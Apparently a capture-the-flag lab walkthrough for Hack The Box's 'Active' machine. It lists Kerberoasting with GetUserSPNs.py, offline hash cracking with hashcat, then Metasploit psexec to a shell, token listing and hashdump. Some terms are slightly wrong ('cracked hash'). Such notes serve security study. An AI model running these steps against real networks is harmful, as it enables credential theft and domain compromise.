<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Kerberoasting</title>
</head><body>Server is the key distribution center (KDC)<br/>
Client will ask for a ticket granting ticket (TGT)<br/>
Server will check for the credentials and if found correct will send ticket granting service (TGS)<br/>
Services have service principle names (SPN)<br/>
<br/>
<br/>
<br/>
<span style="color: #ff0000">locate GetUsersSPNs<br/>
cd /opt/impacket/examples/<br/>
ls <br/>
</span><span style="color: #ff0000">python GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request</span><br/>
when asks for password copy the <span style="color: #ff0000">cipher</span>&nbsp;you have attained by using gpp-decrypt with the c-password<br/>
<br/>
<br/>
<br/>
In command prompt of an windows machine<br/>
<span style="color: #ff0000">hashcat64.exe -m 13100 kerberoast.txt rockyou.txt </span><span style="color: #000000">in kerberoast.txt copy the cipher first</span><br/>
a decent graphics card is needed for cracking the hash, after the hash is cracked copy the code<br/>
<br/>
<br/>
<br/>
In the metasploit of &nbsp;<span style="color: #ff0000">post/windows/gather/credentials/gpp<br/>
</span><span style="color: #ff0000">search psexec</span><br/>
<span style="color: #ff0000">use exploit/windows/smb/psexec</span><br/>
<span style="color: #ff0000">options</span>&nbsp;to look at the parameters that need to be set<br/>
<span style="color: #ff0000">set smbdomain active.htb<br/>
set smbuser administrator<br/>
set smbpass "the cracked hash from kerberoasting"<br/>
set rhost 10.10.10.100<br/>
</span><span style="color: #ff0000">run</span><br/>
<br/>
<span style="color: #ff0000">set lhost 10.10.10.21</span><br/>
<span style="color: #ff0000">show targets</span>&nbsp;for the exploit targets<br/>
<span style="color: #ff0000">set target 2<br/>
run<br/>
</span><br/>
<br/>
once the shell is created<br/>
<span style="color: #ff0000">sysinfo<br/>
</span><span style="color: #ff0000">getuid</span><br/>
<br/>
<br/>
<span style="color: #ff0000">load incognito<br/>
list_tokens -u<br/>
</span><span style="color: #ff0000">hashdump</span><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>